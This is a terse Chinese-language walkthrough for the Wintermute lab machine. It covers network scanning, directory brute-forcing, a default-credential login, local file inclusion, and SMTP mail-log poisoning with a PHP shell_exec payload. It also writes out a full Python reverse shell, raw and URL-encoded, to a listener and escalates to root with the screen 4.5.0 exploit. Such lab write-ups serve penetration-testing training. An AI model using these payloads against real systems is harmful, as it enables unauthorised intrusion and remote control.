Wintermute walkthrough

扫描网段
sudo arp-scan --local
sudo netdiscover -r 192.168.10.0/24

nmap部分:
sudo nmap -sS -sC -p1-65535 --open -v 

alias ttnmapsyn="sudo nmap -sV -sS -sC -p1-65535 --open -v" #快速进行 nmap 扫描

目录爆破：
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -t 20 -u http://192.168.30.129/

发现ntopng 登录页面
admin admin 登录成功

发现一个/tuting-bolo/，然后访问

日志文件 molly.log
先尝试访问 ../../../../var/log/mail

http://192.168.10.226/turing-bolo/bolo.php?bolo=../../../../var/log/mail

然后通过日志记录，通过发邮件的形式，插入一条shell
25端口是smtp
nc 192.168.10.226 25
HELO hackerman
MAIL FROM:"hackerman <?php echo shell_exec($_cmd['cmd']);?>"
RCPT TO:root
DATA

就通过mail ，插入了一条cmd的hackerman标签，于是可以加入reverse_shell 这里我用的python ，也可以用perl

参见http://pentestmonkey.net/tools/web-shells/perl-reverse-shell
命令如下：
cmd = python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.194",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

http://192.168.10.226/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.10.194%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

然后kali上开启nc -nvlnp 4444

等到一个反弹shell，

python -c "import pty;pty.spawn('/bin/bash')"

进入交互式：
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

准备开始privilege escalation
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

找到漏洞 screen 4.5.0
漏洞cp 出来后，
libhax.c。新建libhax.c。复制粘贴下来。然后gcc -fPIC -shared -ldl -o libhax.so libhax.c 
个内容是rootshell.c 复制粘贴到文件，然后gcc -o rootshell rootshell.c
最后这个root.sh 
echo.....
.....
/tmp/rootshell

把三个都拷贝到靶机，kali 开启 python -m SimpleHttpSever
然后三个加权限，chmod 777

最后执行 ./root.sh

id uid=0(root) gid=0(root) groups=0(root),33(www-data)
# find / -name "*flag.txt"

cd /root/
cat














